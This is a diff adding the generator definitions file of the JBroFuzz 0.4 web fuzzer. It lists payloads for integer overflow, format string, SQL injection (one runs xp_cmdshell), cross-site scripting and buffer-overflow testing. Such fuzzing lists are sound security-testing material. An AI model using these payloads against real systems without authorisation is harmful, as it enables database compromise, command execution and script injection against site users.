@@ -1,0 +1,212 @@
+# JBroFuzz Generator Definitions for version 0.4
+#
+# -----------------------------------------------------------------------------
+# A bit of (fuzzing) theory 
+# -----------------------------------------------------------------------------
+#
+# In the current version, there are two categories of generators. These are:
+# 
+# -> Recursive Generators (R)
+#
+# Recursive generators iterate through all combinations of a set alphabet for 
+# a given length. An example of this is a HEX generator. This will attempt all 
+# possible HEX requests for any given length. For example, if the length was, 
+# say, 5 characters then a recursive generator would attempt all combinations 
+# from 00000 to fffff.
+#
+# -> Replasive Generators (P)
+#
+# Replasive generators substitute the selected range with the value given 
+# from a given value list. An example of this is a XSS generator. This will
+# attempt to check against Cross Site Scripting attacks by substituting a 
+# particular part of the request against the given value list. 
+#
+# -----------------------------------------------------------------------------
+# What JBroFuzz-0.4 supports (what you change in this file and will work)
+# -----------------------------------------------------------------------------
+#
+# This version supports the alteration/addition of replasive generators as seen 
+# below.
+# 
+# Next versions will also support adding recursive generators to this file.
+#
+# -----------------------------------------------------------------------------
+# Adding a new generator (yes, you can brake JBroFuzz if you fuzz this file)
+# -----------------------------------------------------------------------------
+#
+# This file is loaded at runtime. To add a replasive generator follow the 
+# syntax seen below:
+#
+# P:XXX:(comment < 25 chars):SIZE
+# > Category (essentially a comment field)
+# VALUE(1)
+# VALUE(2)
+# ...
+# VALUE(SIZE)
+#
+# Pre:
+# First line must have 4 fields divided by ":"
+# First character must be "P" for replasive
+# XXX has to be unique and 3 letters long
+# Comment has to be less than 24 characters
+# SIZE has to be between [0-32]
+# SIZE must match the total number of lines below the generator
+# Second line (describing the category) must start with ">"
+#
+# -----------------------------------------------------------------------------
+# Alphabet String Expansion (so that you don't get bored of pasting)
+# -----------------------------------------------------------------------------
+#
+# A value line starting with "f(x)=" will be expanded provided it has the 
+# character " x " between a String and a positive integer. 
+#
+# Here is an example:
+#
+# f(x)=A x 100 
+# 
+# Will produce a line of 100 A's
+#
+# -----------------------------------------------------------------------------
+# What JBroFuzz-0.4 does not support (file changes that will NOT work)
+# -----------------------------------------------------------------------------
+#
+# This version does not support the addition/alteration
+# of recursive generators (starting with R)
+#
+# Copyright (C) 2007 subere (at) uncon org
+# Version 0.4
+#
+
+P:INT:Integer Overflows:12
+> Exploits | Integer values 
+-1
+0
+0x100
+0x1000
+0x3fffffff
+0x7ffffffe
+0x7fffffff
+0x80000000
+0xfffffffe
+0xffffffff
+0x10000
+0x100000
+
+P:FSE:Format String Errors:19
+> Exploits | Format String Errors
+%s%p%x%d
+.1024d
+%.2049d
+%p%p%p%p
+%x%x%x%x
+%d%d%d%d
+%s%s%s%s
+%99999999999s
+%08x
+%%20d
+%%20n
+%%20x
+%%20s
+%s%s%s%s%s%s%s%s%s%s
+%p%p%p%p%p%p%p%p%p%p
+%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%j%z%Z%t%i%e%g%f%a%C%S%08x%%
+f(x)=%s x 123
+f(x)=%x x 255
+
+P:SQL:SQL Injection:12
+> Database | Injection Attacks
+a'
+?
+' or 1=1
+‘ or 1=1 --
+x' AND userid IS NULL; --
+x' AND email IS NULL; --
+anything' OR 'x'='x
+x' AND 1=(SELECT COUNT(*) FROM tabname); --
+x' AND members.email IS NULL; --
+x' OR full_name LIKE '%Bob%
+23 OR 1=1
+'; exec master..xp_cmdshell 'ping 172.10.1.255'--
+
+P:XSS:Cross Site Scripting:12
+> Cross Site Scripting
+<IMG SRC=javascript:alert('XSS')>
+<IMG SRC=JaVaScRiPt:alert('XSS')>
+<IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
+<IMG """><SCRIPT>alert("XSS")</SCRIPT>">",
+<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC="jav&#x0D;ascript:alert('XSS');">
+perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
+<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+
+R:HEX:Hexadecimal Fuzz Type:16
+> Category String | Characters | Hex
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+a
+b
+c
+d
+e
+f
+
+R:DEC:Decimal Fuzz Type:10
+> Category String | Characters | Dec
+0
+1
+2
+3
+4
+5
+6
+7
+8
+9
+
+R:OCT:Octal Fuzz Type:8
+> Category String | Characters | Octal
+0
+1
+2
+3
+4
+5
+6
+7
+
+R:BIN:Binary Fuzz Type:2
+> Category String | Characters | Binary
+0
+1
+
+P:BFO:Buffer Overflows:17
+> Exploits | Buffer overflows
+A
+f(x)=A x 3
+f(x)=A x 5
+f(x)=A x 9
+f(x)=A x 17
+f(x)=A x 33
+f(x)=A x 65
+f(x)=A x 129
+f(x)=A x 257
+f(x)=A x 513
+f(x)=A x 1025
+f(x)=A x 2049
+f(x)=A x 4197
+f(x)=A x 8193
+f(x)=A x 16385
+f(x)=A x 32769
+f(x)=A x 65537
